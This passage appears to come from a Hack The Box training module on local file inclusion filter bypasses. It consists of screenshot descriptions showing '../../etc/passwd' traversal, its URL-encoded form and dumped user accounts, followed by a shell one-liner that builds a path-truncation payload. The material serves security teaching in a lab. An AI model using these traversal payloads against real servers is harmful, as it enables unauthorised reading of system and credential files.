...
![Shipping containers and cranes at a port with PHP include error messages displayed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_blacklist.png)
...
![Shipping containers and cranes at a port with a list of system user accounts displayed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_blacklist_passwd.png)
...
![Burp Suite Decoder showing path traversal input '../../etc/passwd' and its URL-encoded output.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_blacklist_passwd_filter.png)
...
![Shipping containers and cranes at a port with a list of system user accounts displayed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_blacklist_passwd_filter.png)
...
```shell-session
underhill341@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
